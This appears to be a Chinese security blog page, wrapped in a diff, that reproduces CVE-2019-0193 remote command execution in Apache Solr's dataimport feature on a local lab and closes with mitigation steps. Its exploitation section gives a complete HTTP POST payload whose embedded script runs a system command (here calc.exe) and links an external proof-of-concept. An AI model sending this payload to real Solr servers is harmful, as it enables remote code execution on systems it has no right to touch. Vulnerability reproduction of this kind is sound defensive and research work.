@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html  lang="en" >
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, minimum-scale=1, initial-scale=1, maximum-scale=5, viewport-fit=cover">
+    <title>Apache Solr 远程命令执行漏洞复现 | Hexo</title>
+    <meta name="description" content="CVE-2019-0193：Apache Solr 远程命令执行漏洞复现Apache solr 介绍Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。  影响范围Solr &lt;&#x3D; 8.2.0且开启了dataimport功能(目前无补丁)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache Solr 远程命令执行漏洞复现">
+<meta property="og:url" content="http://example.com/2019/11/05/Apache-Solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="CVE-2019-0193：Apache Solr 远程命令执行漏洞复现Apache solr 介绍Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。  影响范围Solr &lt;&#x3D; 8.2.0且开启了dataimport功能(目前无补丁)">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/1572966771086.png">
+<meta property="og:image" content="http://example.com/images/1572966833695.png">
+<meta property="og:image" content="http://example.com/images/1572966947773.png">
+<meta property="og:image" content="http://example.com/images/1572967173262.png">
+<meta property="og:image" content="http://example.com/images/1572967142750.png">
+<meta property="article:published_time" content="2019-11-05T15:07:13.000Z">
+<meta property="article:modified_time" content="2019-11-06T08:12:33.225Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Solr 远程命令执行">
+<meta property="article:tag" content="CVE-2019-0193">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/1572966771086.png">
+
+    <link rel="alternate" type="application/atom+xml" href="/atom.xml">
+    <link rel="icon" href="/images/favicon.ico" type="image/x-icon">
+
+    
+<link rel="stylesheet" href="/css/common.min.css">
+
+
+
+    
+    
+    
+    
+        <link href="//cdn.jsdelivr.net/npm/lightgallery.js@1.1.3/dist/css/lightgallery.min.css" rel="stylesheet">
+    
+    
+    
+<link rel="stylesheet" href="/css/iconfont.min.css">
+
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+    <body>
+        <header class="header header-fixture">
+    <div class="profile-search-wrap flex sm:block">
+        
+        
+        <div class="profile sm:text-center md:px-1 lg:px-3 sm:pb-4 sm:pt-6">
+            <a id="avatar" role="link" href="https://github.com/fengkx" class="inline-block lg:w-16 lg:h-16 w-8 h-8 m-2" target="_blank" rel="noopener" rel="noreferrer" >
+                <img src="https://www.gravatar.com/avatar/0bc83cb571cd1c50ba6f3e8a78ef1346?s=128" class="rounded-full" alt="avatar">
+            </a>
+            <h2 id="name" class="hidden lg:block">h00ls</h2>
+            <h3 id="title" class="hidden xl:block">安全那些事</h3>
+            
+            <small id="location" class="hidden lg:block">
+                <i class="iconfont icon-map-icon"></i>
+                Sichuan, China
+            </small>
+            
+        </div>
+        
+        
+<div class="search flex-1 flex lg:inline-block sm:hidden lg:px-4 lg:mt-2 lg:mb-4 lg:w-full">
+    <form id="search-form" class="my-auto flex-1 lg:border lg:border-solid lg:border-gray-200">
+        <div class="input-group table bg-gray-100 lg:bg-white w-full">
+            <input id="search-input" type="text" placeholder="Search" class="inline-block w-full bg-gray-100 lg:bg-white">
+            <span class="table-cell">
+                <button name="search tigger button" disabled>
+                    <i class="iconfont icon-search m-2"></i>
+                </button>
+            </span>
+        </div>
+    </form>
+        
+<script id="search-teamplate" type="text/html" data-path="/content.json">
+    <div>
+        <div class="search-header bg-gray-400">
+            <input id="actual-search-input" model="keyword" ref="input" class="inline-block w-full h-10 px-2 py-1" placeholder="Search" type="text">
+        </div>
+        <div class="search-result bg-gray-200">
+            {{#each searchPosts}}
+            <a href="/{{ path }}" class="result-item block px-2 pb-3 mb-1 pt-1 hover:bg-indigo-100">
+                <i class="iconfont icon-file"></i>
+                <h1 class="result-title inline font-medium text-lg">{{ title }}</h1>
+                <p class="result-content text-gray-600 text-sm">{{{ text }}}</p>
+            </a>
+            {{/each}}
+        </div>
+    </div>
+</script>
+
+</div>
+
+
+        <button name="menu toogle button" id="menu-toggle-btn" class="block sm:hidden p-3" role="button" aria-expanded="false">
+            <i class="iconfont icon-hamburger"></i>
+        </button>
+    </div>
+    <nav id="menu-nav" class="hidden sm:flex flex-col">
+        
+        
+            <div class="menu-item menu-home" role="menuitem">
+                <a href="/.">
+                    <i class="iconfont icon-home" aria-hidden="true"></i>
+                    <span class="menu-title">Home</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-archives" role="menuitem">
+                <a href="/archives">
+                    <i class="iconfont icon-archive" aria-hidden="true"></i>
+                    <span class="menu-title">Archives</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-categories" role="menuitem">
+                <a href="/categories">
+                    <i class="iconfont icon-folder" aria-hidden="true"></i>
+                    <span class="menu-title">Categories</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-tags" role="menuitem">
+                <a href="/tags">
+                    <i class="iconfont icon-tag" aria-hidden="true"></i>
+                    <span class="menu-title">Tags</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-repository" role="menuitem">
+                <a href="/repository">
+                    <i class="iconfont icon-project" aria-hidden="true"></i>
+                    <span class="menu-title">Repository</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-links" role="menuitem">
+                <a href="/links">
+                    <i class="iconfont icon-friend" aria-hidden="true"></i>
+                    <span class="menu-title">Links</span>
+                </a>
+            </div>
+        
+        
+            <div class="menu-item menu-about" role="menuitem">
+                <a href="/about">
+                    <i class="iconfont icon-cup" aria-hidden="true"></i>
+                    <span class="menu-title">About</span>
+                </a>
+            </div>
+        
+        
+<div class="social-links flex sm:flex-col lg:hidden mt-5">
+    
+        <span class="social-item text-center">
+            <a target="_blank" rel="noopener" href="https://github.com/fengkx">
+                <i class="iconfont social-icon icon-github"></i>
+                <span class="menu-title hidden lg:inline">menu.github</span>
+            </a>
+        </span>
+    
+        <span class="social-item text-center">
+            <a target="_blank" rel="noopener" href="https://t.me/fengkx">
+                <i class="iconfont social-icon icon-telegram"></i>
+                <span class="menu-title hidden lg:inline">menu.telegram</span>
+            </a>
+        </span>
+    
+        <span class="social-item text-center">
+            <a target="_blank" rel="noopener" href="https://twitter.com/example">
+                <i class="iconfont social-icon icon-twitter"></i>
+                <span class="menu-title hidden lg:inline">menu.twitter</span>
+            </a>
+        </span>
+    
+        <span class="social-item text-center">
+            <a href="/atom.xml">
+                <i class="iconfont social-icon icon-rss"></i>
+                <span class="menu-title hidden lg:inline">menu.rss</span>
+            </a>
+        </span>
+    
+</div>
+
+
+    </nav>
+</header>
+
+        <section class="main-section">
+            
+    <main class="flex-1 px-4 py-12 md:px-5 lg:px-8 lg:py-4 relative min-h-screen">
+    
+
+    <article class="content article article-archives article-type-list" itemscope="">
+        <header class="article-header">
+            
+    
+        <h1 class="article-title text-lg" itemprop="name">
+            Apache Solr 远程命令执行漏洞复现
+        </h1>
+    
+
+
+
+            <p class="article-meta mb-3 text-xs">
+                <span class="article-date">
+    <i class="iconfont icon-calendar-check"></i>
+	<a href="/2019/11/05/Apache-Solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
+	  <time datetime="2019-11-05T15:07:13.000Z" itemprop="datePublished">Nov 5</time>
+	</a>
+</span>
+
+                
+
+                
+    <span class="article-tags">
+    <i class="iconfont icon-tag"></i>
+    <a class="article-tag-none-link" href="/tags/CVE-2019-0193/" rel="tag">CVE-2019-0193</a>, <a class="article-tag-none-link" href="/tags/Solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">Solr 远程命令执行</a>
+  </span>
+
+
+                <span class="_partial/post-comment"><i class="icon icon-comment"></i>
+                    <a href="/2019/11/05/Apache-Solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#comments" class="article-comment-link">
+                        Comments
+                    </a>
+                </span>
+                
+    
+        <span class="post-wordcount" itemprop="wordCount">Word Count: 418(words)</span>
+    
+    
+        <span class="post-readcount" itemprop="timeRequired">Read Count: 2(minutes)</span>
+    
+
+
+            </p>
+        </header>
+        <div class="marked-body article-body">
+            <h2 id="CVE-2019-0193：Apache-Solr-远程命令执行漏洞复现"><a href="#CVE-2019-0193：Apache-Solr-远程命令执行漏洞复现" class="headerlink" title="CVE-2019-0193：Apache Solr 远程命令执行漏洞复现"></a>CVE-2019-0193：Apache Solr 远程命令执行漏洞复现</h2><h3 id="Apache-solr-介绍"><a href="#Apache-solr-介绍" class="headerlink" title="Apache solr 介绍"></a>Apache solr 介绍</h3><p>Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。 </p>
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Solr &lt;= 8.2.0且开启了dataimport功能(目前无补丁) </p>
+<a id="more"></a>
+
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载地址：<a target="_blank" rel="noopener" href="http://www.apache.org/dyn/closer.lua/lucene/solr/7.7.2/solr-7.7.2.zip">http://www.apache.org/dyn/closer.lua/lucene/solr/7.7.2/solr-7.7.2.zip</a> </p>
+<p>在solr-7.7.2目录中，执行命令 <code>bin/solr -e dih</code></p>
+<p><img src="/images/1572966771086.png" alt="1572966771086"></p>
+<p>访问 <code>http://127.0.0.1:8983</code></p>
+<p><img src="/images/1572966833695.png" alt="1572966833695"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>通过接口 <code>curl http://127.0.0.1:8983/solr/admin/cores  </code>获取所有 core 信息，下面我们构造 payload 需要 name 信息</p>
+<p><img src="/images/1572966947773.png" alt="1572966947773"></p>
+<p>使用burpsuite发送下面包。替换相应的<core_name>就行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;solr&#x2F;&lt;修改这里&gt;&#x2F;dataimport HTTP&#x2F;1.1</span><br><span class="line">Host: 10.10.10.22:8983</span><br><span class="line">Content-Length: 496</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0</span><br><span class="line">Content-type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">command&#x3D;full-import&amp;verbose&#x3D;false&amp;clean&#x3D;false&amp;commit&#x3D;true&amp;debug&#x3D;true&amp;core&#x3D;&lt;修改这里&gt;&amp;name&#x3D;dataimport&amp;dataConfig&#x3D;</span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line">&lt;dataSource type&#x3D;&quot;URLDataSource&quot;&#x2F;&gt;</span><br><span class="line">&lt;script&gt;&lt;![CDATA[</span><br><span class="line">function poc(row)&#123;</span><br><span class="line">var process&#x3D; java.lang.Runtime.getRuntime();</span><br><span class="line">process.exec(&quot;calc.exe&quot;);</span><br><span class="line">return row;</span><br><span class="line">&#125;</span><br><span class="line">]]&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;document&gt;</span><br><span class="line">&lt;entity name&#x3D;&quot;stackoverflow&quot;</span><br><span class="line">url&#x3D;&quot;https:&#x2F;&#x2F;stackoverflow.com&#x2F;feeds&#x2F;tag&#x2F;solr&quot;</span><br><span class="line">processor&#x3D;&quot;XPathEntityProcessor&quot;</span><br><span class="line">forEach&#x3D;&quot;&#x2F;feed&quot;</span><br><span class="line">transformer&#x3D;&quot;script:poc&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;document&gt;</span><br><span class="line">&lt;&#x2F;dataConfig&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/1572967173262.png" alt="1572967173262"></p>
+<p>上面的命令是弹出计算机。</p>
+<p><img src="/images/1572967142750.png" alt="1572967142750"></p>
+<p>尝试了多次，有时候能成功。感觉，不好使用。</p>
+<p>给出一个POC：<code>https://github.com/jas502n/CVE-2019-0193/blob/master/CVE-2019-0193.py </code></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1.升级到最新版本,设置<code>enable.dih.dataConfigParam</code>为<code>false</code>(目前最新版本为8.2.0)</p>
+<p>2.暂时关闭<code>dataimport</code>功能</p>
+
+        </div>
+        
+<blockquote class="copyright">
+    <p><strong>Link to this article : </strong><a class="permalink" href="http://example.com/2019/11/05/Apache-Solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">http://example.com/2019/11/05/Apache-Solr-远程命令执行漏洞复现/</a></p>
+    <p><strong>This article is available under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a> License</strong></p>
+</blockquote>
+
+
+    </article>
+    
+    <section id="comments">
+        
+    </section>
+
+
+    
+
+</main>
+
+
+<aside style="" id="sidebar" class="aside aside-fixture">
+    <div class="toc-sidebar">
+        <nav id="toc" class="article-toc">
+            <h3 class="toc-title">Catalogue</h3>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-0193%EF%BC%9AApache-Solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">CVE-2019-0193：Apache Solr 远程命令执行漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-solr-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">Apache solr 介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">1.2.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.3.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.5.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li></ol>
+        </nav>
+    </div>
+</aside>
+
+
+
+
+
+        </section>
+        <footer class="hidden lg:block fixed bottom-0 left-0 sm:w-1/12 lg:w-1/6 bg-gray-100 z-40">
+    
+    <div class="footer-social-links">
+        
+            <a target="_blank" rel="noopener" href="https://github.com/fengkx">
+                <i class="iconfont icon-github"></i>
+            </a>
+        
+            <a target="_blank" rel="noopener" href="https://t.me/fengkx">
+                <i class="iconfont icon-telegram"></i>
+            </a>
+        
+            <a target="_blank" rel="noopener" href="https://twitter.com/example">
+                <i class="iconfont icon-twitter"></i>
+            </a>
+        
+            <a href="/atom.xml">
+                <i class="iconfont icon-rss"></i>
+            </a>
+        
+    </div>
+    
+    
+</footer>
+
+        <div id="mask" class="hidden mask fixed inset-0 bg-gray-900 opacity-75 z-40"></div>
+        <div id="search-view-container" class="hidden shadow-xl"></div>
+        
+<script src="/js/dom-event.min.js"></script>
+
+<script src="//cdn.jsdelivr.net/npm/yox@1.0.0-alpha.121/dist/standard/prod/yox.min.js"></script>
+
+
+<script src="/js/search.min.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/lightgallery.js@1.1.3/dist/js/lightgallery.min.js"></script>
+    
+<script src="/js/light-gallery.min.js"></script>
+
+
+
+
+
+    </body>
+</html>
